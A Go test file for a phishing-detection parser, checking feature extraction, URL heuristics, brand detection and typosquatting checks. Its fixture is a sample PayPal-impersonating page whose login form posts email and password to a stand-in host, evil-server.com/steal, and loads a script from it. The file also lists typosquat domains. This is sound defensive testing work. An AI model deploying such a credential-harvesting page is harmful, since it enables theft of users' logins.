package parser

import (
	"testing"

	"aegis-phishing/internal/model"
)

// Sample HTML simulating a phishing page with credential harvesting form.
const phishingHTML = `
<!DOCTYPE html>
<html>
<head>
	<title>PayPal - Login</title>
	<meta name="description" content="Log in to your PayPal account">
	<link rel="icon" href="/favicon.ico">
</head>
<body>
	<div>Welcome to PayPal. Please log in to verify your account.</div>
	<form action="https://evil-server.com/steal" method="POST">
		<input type="text" name="email" placeholder="Email">
		<input type="password" name="password" placeholder="Password">
		<input type="hidden" name="redirect" value="https://paypal.com">
		<button type="submit">Log In</button>
	</form>
	<a href="https://paypal.com">PayPal Official</a>
	<a href="https://evil-server.com/phish2">Verify</a>
	<a href="https://evil-server.com/reset">Reset</a>
	<a href="/dashboard">Dashboard</a>
	<script src="https://evil-server.com/tracker.js"></script>
	<script>console.log('phish')</script>
</body>
</html>`

// Sample HTML simulating a legitimate personal blog.
const normalHTML = `
<!DOCTYPE html>
<html>
<head>
	<title>My Personal Blog</title>
	<meta name="description" content="A blog about tech and programming">
</head>
<body>
	<h1>Welcome to My Blog</h1>
	<p>This is a personal website with some articles and projects.</p>
	<a href="/about">About</a>
	<a href="/blog">Blog</a>
	<a href="/contact">Contact</a>
	<script>console.log('analytics')</script>
</body>
</html>`

func TestExtractPhishingFeatures(t *testing.T) {
	p := NewParser()
	sslInfo := &model.SSLInfo{
		Valid:        true,
		Issuer:       "Let's Encrypt",
		IsSelfSigned: false,
	}

	features := p.Extract(phishingHTML, "https://paypal-login.tk/verify", sslInfo)

	if features.Title != "PayPal - Login" {
		t.Errorf("Title = %q, want %q", features.Title, "PayPal - Login")
	}

	if features.MetaDescription != "Log in to your PayPal account" {
		t.Errorf("MetaDescription = %q", features.MetaDescription)
	}

	if !features.HasForm {
		t.Error("HasForm should be true")
	}

	if !features.HasPasswordField {
		t.Error("HasPasswordField should be true")
	}

	if !features.FormActionExternal {
		t.Error("FormActionExternal should be true (action points to evil-server.com)")
	}

	if len(features.HiddenInputNames) == 0 {
		t.Error("Should detect hidden input fields")
	}

	if features.TotalLinks != 4 {
		t.Errorf("TotalLinks = %d, want 4", features.TotalLinks)
	}

	if features.ExternalLinks != 3 {
		t.Errorf("ExternalLinks = %d, want 3 (paypal.com + 2 evil-server links)", features.ExternalLinks)
	}

	if len(features.ExternalDomains) == 0 {
		t.Error("Should have external domains")
	}

	if !features.URLHasSuspiciousTLD {
		t.Error("URLHasSuspiciousTLD should be true for .tk domain")
	}

	if !features.URLIsHTTPS {
		t.Error("URLIsHTTPS should be true")
	}

	if features.ScriptCount != 2 {
		t.Errorf("ScriptCount = %d, want 2", features.ScriptCount)
	}

	if features.ExternalScripts != 1 {
		t.Errorf("ExternalScripts = %d, want 1", features.ExternalScripts)
	}

	if features.SSLInfo == nil {
		t.Error("SSLInfo should not be nil when provided")
	}

	if len(features.VisibleText) == 0 {
		t.Error("VisibleText should not be empty")
	}
}

func TestExtractNormalFeatures(t *testing.T) {
	p := NewParser()
	features := p.Extract(normalHTML, "https://myblog.com", nil)

	if features.Title != "My Personal Blog" {
		t.Errorf("Title = %q", features.Title)
	}

	if features.HasForm {
		t.Error("HasForm should be false for blog site")
	}

	if features.HasPasswordField {
		t.Error("HasPasswordField should be false for blog site")
	}

	if features.TotalLinks != 3 {
		t.Errorf("TotalLinks = %d, want 3", features.TotalLinks)
	}

	if features.ExternalLinks != 0 {
		t.Errorf("ExternalLinks = %d, want 0 (all relative links)", features.ExternalLinks)
	}

	if features.ScriptCount != 1 {
		t.Errorf("ScriptCount = %d, want 1", features.ScriptCount)
	}

	if features.URLHasSuspiciousTLD {
		t.Error("URLHasSuspiciousTLD should be false for .com")
	}
}

func TestExtractURLFeatures(t *testing.T) {
	p := NewParser()

	tests := []struct {
		name    string
		url     string
		check   func(*model.PageFeatures) bool
		errDesc string
	}{
		{"IP address URL", "https://192.168.1.1/login", func(f *model.PageFeatures) bool { return f.URLUsesIP }, "URLUsesIP"},
		{"Suspicious TLD", "https://test.xyz/page", func(f *model.PageFeatures) bool { return f.URLHasSuspiciousTLD }, "URLHasSuspiciousTLD"},
		{"HTTPS URL", "https://secure.com", func(f *model.PageFeatures) bool { return f.URLIsHTTPS }, "URLIsHTTPS"},
		{"Non-HTTPS URL", "http://nosecure.com", func(f *model.PageFeatures) bool { return !f.URLIsHTTPS }, "!URLIsHTTPS"},
		{"URL with @ symbol", "https://user@evil.com", func(f *model.PageFeatures) bool { return f.URLHasAtSymbol }, "URLHasAtSymbol"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := &model.PageFeatures{}
			p.extractURLFeatures(tt.url, f)
			if !tt.check(f) {
				t.Errorf("%s: check failed for URL %s", tt.errDesc, tt.url)
			}
		})
	}
}

func TestDetectBrandInTitle(t *testing.T) {
	p := NewParser()

	tests := []struct {
		title string
		want  string
	}{
		{"PayPal - Login", "paypal"},
		{"Facebook - Log In or Sign Up", "facebook"},
		{"My Blog", ""},
		{"Google Account Sign In", "google"},
	}

	for _, tt := range tests {
		t.Run(tt.title, func(t *testing.T) {
			got := p.DetectBrandInTitle(tt.title)
			if got != tt.want {
				t.Errorf("DetectBrandInTitle(%q) = %q, want %q", tt.title, got, tt.want)
			}
		})
	}
}

func TestIsTypoSquatting(t *testing.T) {
	p := NewParser()

	tests := []struct {
		domain string
		want   bool
	}{
		{"paypal.com", false},        // legitimate domain
		{"paypa1.com", true},         // single character substitution
		{"paypal-login.com", true},   // brand + suffix
		{"faceb00k.com", true},       // character replacement
		{"random-site.com", false},   // unrelated domain
		{"google.com", false},        // legitimate domain
		{"goog1e.com", true},         // typosquatting
	}

	for _, tt := range tests {
		t.Run(tt.domain, func(t *testing.T) {
			got := p.IsTypoSquatting(tt.domain)
			if got != tt.want {
				t.Errorf("IsTypoSquatting(%q) = %v, want %v", tt.domain, got, tt.want)
			}
		})
	}
}

func TestExtractFormsNoForm(t *testing.T) {
	p := NewParser()
	features := p.Extract(normalHTML, "https://blog.com", nil)

	if features.HasForm {
		t.Error("Blog HTML should not contain a form element")
	}
	if features.FormActionExternal {
		t.Error("Should not have external form action")
	}
}
